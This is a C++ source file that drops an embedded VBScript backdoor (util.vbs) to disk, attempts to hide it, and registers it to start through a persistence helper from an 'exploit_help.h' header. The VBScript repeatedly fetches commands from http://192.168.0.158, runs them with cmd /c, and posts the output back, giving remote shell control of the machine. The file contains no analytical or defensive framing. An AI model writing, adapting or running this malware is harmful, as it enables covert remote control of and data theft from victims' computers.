
    #include <iostream>
    #include <fstream>
    #include <windows.h>
    #include "exploit_help.h"
    #include <memory>
    int main(int argc, char const *argv[]) {
       auto system = std::make_unique<exploit>();
       std::string code = " \n\
Option Explicit \n\
On Error Resume Next \n\
CONST callbackUrl = \"http://192.168.0.158:80/\" \n\
Dim xmlHttpReq, shell, execObj, command, break, result \n\
Set shell = CreateObject(\"WScript.Shell\") \n\
break = False \n\
While break <> True \n\
Set xmlHttpReq = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") \n\
xmlHttpReq.Open \"GET\", callbackUrl, false \n\
xmlHttpReq.Send \n\
command = \"cmd /c \" & Trim(xmlHttpReq.responseText) \n\
If InStr(command, \"EXIT\") Then \n\
    break = True \n\
Else \n\
    Set execObj = shell.Exec(command) \n\
    result = \"\" \n\
    Do Until execObj.StdOut.AtEndOfStream \n\
        result = result & execObj.StdOut.ReadAll() \n\
    Loop \n\
    Set xmlHttpReq = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") \n\
    xmlHttpReq.Open \"POST\", callbackUrl, false \n\
    xmlHttpReq.Send(result) \n\
End If \n\
Wend";
       std::ofstream MyFile(".\\util.vbs");
       MyFile << code;
       MyFile.close();
       DWORD attributes = GetFileAttributes("util.vbs");
       SetFileAttributes("MyFile.txt", attributes + FILE_ATTRIBUTE_HIDDEN);
       system->crontab_add("start util.vbs");
       //system->crontab_add("del util.vbs");
       return 0;
    }
    